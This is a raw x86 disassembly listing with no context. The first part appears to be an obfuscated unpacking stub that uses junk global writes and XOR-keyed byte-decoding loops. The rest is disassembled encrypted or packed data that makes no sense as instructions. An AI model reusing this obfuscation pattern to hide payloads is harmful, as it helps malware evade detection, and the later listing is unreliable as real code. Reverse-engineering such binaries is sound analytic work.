  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x432e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x432ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x432e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x432ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x432e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x432ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x432e37,0x432eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x432e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x432e9b,0x0
  403a3e:	mov    eax,ds:0x432e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x432e9b,eax
  403a49:	cmp    DWORD PTR ds:0x432e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x43fdf3
  403a67:	cmp    DWORD PTR ds:0x432e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x432e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x432e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x432e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x432ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x432eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x432ea7,0x432e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x432ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x432e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x432e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x434dfb
  403aec:	mov    eax,ds:0x437087
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x432e33,0x15
  403b03:	cmp    DWORD PTR ds:0x432e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x432e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x432e23
  403b27:	call   DWORD PTR ds:0x43fdf7
  403b2d:	mov    ecx,DWORD PTR ds:0x432e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x432e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x432e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x432e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x432ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	lds    ebp,FWORD PTR [ecx+0x48]
  403e73:	push   es
  403e74:	inc    edi
  403e75:	pusha  
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0x9
  403e7d:	and    BYTE PTR [esi+0x231328f9],al
  403e83:	hlt    
  403e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e85:	out    0x6a,al
  403e87:	call   0x1bd9:0xadaecbcc
  403e8e:	xchg   edx,eax
  403e8f:	sub    eax,0x8aa0adf7
  403e94:	arpl   WORD PTR [eax+edi*1-0xb],ax
  403e98:	mov    ch,0x2
  403e9a:	jmp    0x10cb:0xac360846
  403ea1:	jecxz  0x403eed
  403ea3:	stos   DWORD PTR es:[edi],eax
  403ea4:	jmp    0x2c32ee2b
  403ea9:	fld    DWORD PTR [esp+ebx*8+0x40]
  403ead:	sbb    cl,BYTE PTR [eax]
  403eaf:	xor    al,0xad
  403eb1:	or     eax,0x538763af
  403eb6:	adc    DWORD PTR [ebx],ebx
  403eb8:	inc    esp
  403eb9:	fst    DWORD PTR [ecx-0x5]
  403ebc:	and    bh,BYTE PTR [ecx+ebx*2-0x2ea8a888]
  403ec3:	push   ebx
  403ec4:	sub    BYTE PTR [ecx],ah
  403ec6:	mov    ebx,0x60b7a3ae
  403ecb:	mov    esp,0x34adfe5c
  403ed0:	fidivr DWORD PTR [eax]
  403ed2:	scas   eax,DWORD PTR es:[edi]
  403ed3:	stc    
  403ed4:	xchg   edx,eax
  403ed5:	(bad)  [edi-0x25]
  403ed8:	ja     0x403f47
  403eda:	mov    edx,0x510ed3ee
  403edf:	lods   eax,DWORD PTR ds:[esi]
  403ee0:	inc    ebp
  403ee1:	dec    eax
  403ee2:	mov    ah,0xe6
  403ee4:	inc    ebp
  403ee5:	pop    ds
  403ee6:	test   al,0xc3
  403ee8:	and    DWORD PTR [ecx-0x7b],edi
  403eeb:	add    DWORD PTR [edx+0x3b],ebp
  403eee:	dec    esp
  403eef:	mov    cl,0x57
  403ef1:	inc    ebp
  403ef2:	lds    ecx,FWORD PTR [eax+0xc]
  403ef5:	push   0x34
  403ef7:	aam    0x66
  403ef9:	jbe    0x403ef9
  403efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403efc:	imul   eax,DWORD PTR [edi],0xfffffff4
  403eff:	ret    
  403f00:	jge    0x403e86
  403f02:	sub    al,0xad
  403f04:	aam    0xcf
  403f06:	ret    
  403f07:	push   ebx
  403f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f09:	pop    es
  403f0a:	sbb    dh,bl
  403f0c:	mov    al,0xbc
  403f0e:	hlt    
  403f0f:	scas   al,BYTE PTR es:[edi]
  403f10:	pop    esi
  403f11:	out    dx,eax
  403f12:	adc    eax,0x25b2b714
  403f17:	pop    ss
  403f18:	jmp    0x94fb:0x976959ff
  403f1f:	je     0x403ea1
  403f21:	fadd   st(0),st
  403f23:	sbb    ch,BYTE PTR [edx+0x42]
  403f26:	sti    
  403f27:	call   0xf0ab:0xb1bdc330
  403f2e:	adc    bh,BYTE PTR [esi]
  403f30:	sti    
  403f31:	leave  
  403f32:	cmp    edx,esp
  403f34:	mov    ?,WORD PTR es:[esi]
  403f37:	iret   
  403f38:	mov    eax,ds:0xe47764ff
  403f3d:	jbe    0x403fb0
  403f3f:	and    cl,dh
  403f41:	(bad)  
  403f42:	mov    eax,DWORD PTR [ecx+0x54d0f288]
  403f48:	dec    edx
  403f49:	sbb    edi,edx
  403f4b:	sbb    esi,DWORD PTR [esi-0x3ccc1bcd]
  403f51:	xor    bl,BYTE PTR [edx+0x6c]
  403f54:	sub    bh,ch
  403f56:	pop    edx
  403f57:	add    DWORD PTR [ebx-0x7bad92ba],0xffffffe7
  403f5e:	push   edi
  403f5f:	in     eax,0x35
  403f61:	dec    edx
  403f62:	pop    ss
  403f63:	push   ebp
  403f64:	xchg   DWORD PTR [ebx-0x23eb1abc],ebx
  403f6a:	pop    ds
  403f6b:	dec    dl
  403f6d:	mov    edx,0xda4e61a8
  403f72:	push   0x40830f87
  403f77:	jbe    0x403f38
  403f79:	adc    ecx,esp
  403f7b:	mov    al,ds:0x5c64580
  403f80:	jp     0x403fac
  403f82:	push   esp
  403f83:	inc    edi
  403f84:	or     eax,0xedf34aed
  403f89:	xor    al,0x1e
  403f8b:	and    al,0x2a
  403f8d:	das    
  403f8e:	popf   
  403f8f:	sbb    cl,BYTE PTR [esi-0x4ab732d8]
  403f95:	sbb    bh,BYTE PTR [ebp+0x6ba591ab]
  403f9b:	repz dec eax
  403f9d:	jge    0x403f7f
  403f9f:	ds test ch,bl
  403fa2:	mov    dl,0x8a
  403fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa5:	jmp    0x6679076
  403faa:	lods   al,BYTE PTR ds:[esi]
  403fab:	stc    
  403fac:	pop    edx
  403fad:	ror    dh,1
  403faf:	jb     0x40400d
  403fb1:	mov    al,0x70
  403fb3:	add    BYTE PTR [ecx+0x7c713eac],0x35
  403fba:	push   es
  403fbb:	jecxz  0x403f96
  403fbd:	test   BYTE PTR [edi],bl
  403fbf:	sbb    eax,0xc09ee678
  403fc4:	xor    eax,0x7068ce3a
  403fc9:	scas   al,BYTE PTR es:[edi]
  403fca:	retf   0xcd03
  403fcd:	inc    esi
  403fce:	push   eax
  403fcf:	adc    edx,DWORD PTR [ebp+0x5256f9b]
  403fd5:	fld    QWORD PTR ds:0xbc17ba24
  403fdb:	retf   0x3f7a
  403fde:	sub    cl,BYTE PTR [ebp+0x54]
  403fe1:	or     eax,DWORD PTR [ebp+0x556cdae4]
  403fe7:	out    0x43,eax
  403fe9:	and    DWORD PTR ds:0x94a2bb22,edx
  403fef:	dec    edi
  403ff0:	ins    BYTE PTR es:[edi],dx
  403ff1:	ja     0x403fce
  403ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff4:	dec    DWORD PTR [esi]
  403ff6:	cmp    esi,DWORD PTR [ebp-0x7c]
  403ff9:	xor    BYTE PTR [esi+esi*2],al
  403ffc:	ret    
  403ffd:	and    eax,0xf208ed63
  404002:	daa    
  404003:	les    edx,FWORD PTR [edi*2-0x57b42d8]
  40400a:	mov    edi,ds
  40400c:	jne    0x403fce
  40400e:	dec    edi
  40400f:	mov    cl,0xbb
  404011:	call   0xca8cab9f
  404016:	loop   0x404048
  404018:	hlt    
  404019:	xchg   esp,ecx
  40401b:	jb     0x40401b
  40401d:	sbb    ch,BYTE PTR [ecx+ebx*8+0x26]
  404021:	shl    BYTE PTR [eiz*2+0x39a8b712],0xd6
  404029:	rol    BYTE PTR [esi+edi*1+0x10],1
  40402d:	mov    ebx,0xb4251720
  404032:	out    0xc0,eax
  404034:	push   eax
  404035:	mov    cl,0x58
  404037:	push   ecx
  404038:	cmp    esi,edi
  40403a:	push   edx
  40403b:	jge    0x40405b
  40403d:	mov    dl,0x22
  40403f:	jp     0x404063
  404041:	mov    al,0x7e
  404043:	push   0x7a10d3ef
  404048:	dec    esp
  404049:	sahf   
  40404a:	imul   eax,DWORD PTR [esi+0x5],0x7b9547f8
  404051:	jge    0x404030
  404053:	data16 and BYTE PTR [edi],ch
  404056:	ret    0xf514
  404059:	cmp    al,0xd4
  40405b:	les    esi,FWORD PTR [ecx]
  40405d:	ret    0x2a21
  404060:	sub    eax,0xc26b72e7
  404065:	out    0xdc,al
  404067:	add    DWORD PTR [ebx-0x5f],ecx
  40406a:	es (bad) 
  40406c:	pusha  
  40406d:	stc    
  40406e:	(bad)  
  40406f:	cmp    BYTE PTR [ebx+0x3a],ah
  404072:	mov    bl,0x71
  404074:	popa   
  404075:	xlat   BYTE PTR ds:[ebx]
  404076:	inc    ebx
  404077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404078:	cs in  eax,0x90
  40407b:	sub    ecx,DWORD PTR [edx+ebp*1-0x5f]
  40407f:	ret    
  404080:	jecxz  0x40402f
  404082:	adc    DWORD PTR [ecx+0x58],edx
  404085:	test   eax,0x9cdfc027
  40408a:	push   edi
  40408b:	bound  ebp,QWORD PTR [edi]
  40408d:	mov    ds:0xe6503d04,al
  404092:	fcmovnu st,st(2)
  404094:	frstor [edx+0x87434d0]
  40409a:	out    0xc6,eax
  40409c:	mov    ss,WORD PTR [esi+0x2c6b4311]
  4040a2:	xchg   edi,eax
  4040a3:	ret    
  4040a4:	sbb    eax,DWORD PTR [ebp-0x78]
  4040a7:	out    dx,al
  4040a8:	and    bl,BYTE PTR [edx-0x4542b4d6]
  4040ae:	jo     0x404083
  4040b0:	gs add al,0xf8
  4040b3:	pop    ecx
  4040b4:	popf   
  4040b5:	pop    ss
  4040b6:	outs   dx,DWORD PTR cs:[esi]
  4040b8:	test   DWORD PTR [esi-0x40],ecx
  4040bb:	lds    esi,FWORD PTR [esi+0x30]
  4040be:	push   es
  4040bf:	jo     0x404113
  4040c1:	xor    ch,ah
  4040c3:	dec    esp
  4040c4:	or     al,0x1c
  4040c6:	nop
  4040c7:	xlat   BYTE PTR ds:[ebx]
  4040c8:	push   cs
  4040c9:	ffreep st(0)
  4040cb:	push   ebp
  4040cc:	xor    cl,BYTE PTR [ecx+0x8ade940]
  4040d2:	add    edi,DWORD PTR [eax+0x6]
  4040d5:	pushf  
  4040d6:	jge    0x404086
  4040d8:	test   ebp,eax
  4040da:	out    dx,eax
  4040db:	pop    ss
  4040dc:	outs   dx,DWORD PTR ds:[esi]
  4040dd:	out    0xaf,al
  4040df:	add    cl,al
  4040e1:	fstp   TBYTE PTR [esi+0x3552655b]
  4040e7:	mov    cl,0x27
  4040e9:	leave  
  4040ea:	xchg   ebp,eax
  4040eb:	lods   eax,DWORD PTR ds:[esi]
  4040ec:	mov    dh,BYTE PTR [esi+0x4a]
  4040ef:	test   DWORD PTR [ecx],esp
  4040f1:	mov    eax,0x11020efe
  4040f6:	adc    al,0xa7
  4040f8:	pushf  
  4040f9:	into   
  4040fa:	rcr    BYTE PTR [ebx],cl
  4040fc:	(bad)  
  4040fd:	pop    ebx
  4040fe:	mov    ah,0x19
  404100:	inc    edx
  404101:	(bad)  
  404102:	push   esp
  404103:	ins    DWORD PTR es:[edi],dx
  404104:	xchg   edx,eax
  404105:	mov    DWORD PTR [esi],esp
  404107:	not    BYTE PTR ds:0x83206ef3
  40410d:	out    dx,eax
  40410e:	and    eax,0xd6b80e8
  404113:	push   esi
  404114:	das    
  404115:	retf   0x159d
  404118:	cwde   
  404119:	add    DWORD PTR [ecx],eax
  40411b:	dec    edi
  40411c:	imul   al
  40411e:	rcr    DWORD PTR [edx+0x15],cl
  404121:	mov    al,ds:0x8b970577
  404126:	or     BYTE PTR [edx+0x76b03aa1],ch
  40412c:	mov    esi,0xa5df74ea
  404131:	fldcw  WORD PTR [ebx]
  404133:	push   ecx
  404134:	push   0x69
  404136:	arpl   WORD PTR [eax],sp
  404138:	pop    edx
  404139:	pavgb  mm2,QWORD PTR [bx+di+0x4227]
  40413f:	call   DWORD PTR [esi+0x38]
  404142:	mov    al,ds:0xa6a08dbf
  404147:	inc    ebx
  404148:	cmp    BYTE PTR [edi-0x559b2aad],bh
  40414e:	and    edi,DWORD PTR [ebx-0x44f39fe6]
  404154:	push   0x66226459
  404159:	push   ebp
  40415a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40415b:	sti    
  40415c:	dec    ecx
  40415d:	int    0x6b
  40415f:	xchg   edx,eax
  404160:	sub    edx,DWORD PTR [ebp-0x5cdd459b]
  404166:	test   al,0xa7
  404168:	push   esi
  404169:	fst    QWORD PTR [esi]
  40416b:	mov    BYTE PTR [ebp+0x5a],cl
  40416e:	mov    edi,0x31adea9f
  404173:	ret    
  404174:	ds stos DWORD PTR es:[edi],eax
  404176:	retf   0x8976
  404179:	sub    eax,0xb64a0a04
  40417e:	out    dx,al
  40417f:	pop    edx
  404180:	adc    dh,bh
  404182:	les    esp,FWORD PTR [edi+eiz*1+0x68]
  404186:	lock mov dh,0x80
  404189:	mov    dh,0x69
  40418b:	test   bh,bh
  40418d:	(bad)  
  40418e:	xlat   BYTE PTR ds:[ebx]
  40418f:	(bad)  
  404190:	cld    
  404191:	test   al,0xef
  404193:	jnp    0x40411c
  404195:	jle    0x404122
  404197:	(bad)  
  404198:	dec    edx
  404199:	cmp    DWORD PTR [edi+esi*4-0x2574e199],ebx
  4041a0:	adc    BYTE PTR [ebx],dh
  4041a2:	pop    ss
  4041a3:	loopne 0x40417f
  4041a5:	jne    0x404164
  4041a7:	or     al,0xe3
  4041a9:	push   esi
  4041aa:	push   cs
  4041ab:	jbe    0x4041c6
  4041ad:	or     BYTE PTR ds:0x51b5e084,dh
  4041b3:	lods   eax,DWORD PTR ds:[esi]
  4041b4:	and    DWORD PTR [edx-0x48],0x48
  4041b8:	adc    al,0x86
  4041ba:	std    
  4041bb:	scas   eax,DWORD PTR es:[edi]
  4041bc:	minps  xmm7,XMMWORD PTR [edx+0x34]
  4041c0:	mov    WORD PTR [ecx],ds
  4041c2:	scas   al,BYTE PTR es:[edi]
  4041c3:	pop    edi
  4041c4:	add    al,0x43
  4041c6:	imul   ecx,DWORD PTR [ecx+eiz*4+0x22],0xfb0dbd52
  4041ce:	clc    
  4041cf:	mov    cl,0xd4
  4041d1:	jg     0x404233
  4041d3:	pop    edx
  4041d4:	mov    fs,WORD PTR [ebx+0x4f]
  4041d7:	lods   al,BYTE PTR ds:[esi]
  4041d8:	pop    ebp
  4041d9:	and    edx,ebx
  4041db:	ja     0x404252
  4041dd:	retf   
  4041de:	sub    DWORD PTR [edi],ebp
  4041e0:	call   0xb51fe9f4
  4041e5:	xor    BYTE PTR [ebx+0x76],bh
  4041e8:	shl    DWORD PTR [ebx],1
  4041ea:	test   eax,0x1ba8206a
  4041ef:	add    edi,DWORD PTR [esi-0x657ed4ba]
  4041f5:	sahf   
  4041f6:	stc    
  4041f7:	inc    eax
  4041f8:	fnsave [edx-0x79]
  4041fb:	xchg   edx,eax
  4041fc:	jge    0x4041b1
  4041fe:	les    eax,FWORD PTR [eax+0x14]
  404201:	js     0x40425a
  404203:	mov    BYTE PTR [ecx+0x6191e876],ch
  404209:	ja     0x4041b6
  40420b:	mov    eax,0x4f722398
  404210:	dec    esp
  404211:	xchg   DWORD PTR [esi+0x5],eax
  404214:	ror    DWORD PTR [ecx+ebp*8+0x5d2df45f],1
  40421b:	or     esi,DWORD PTR ds:0xdb1c94fb
  404221:	xchg   edx,eax
  404222:	int3   
  404223:	sbb    bh,BYTE PTR [eax-0x40d32d65]
  404229:	and    BYTE PTR [edi+0x52],dl
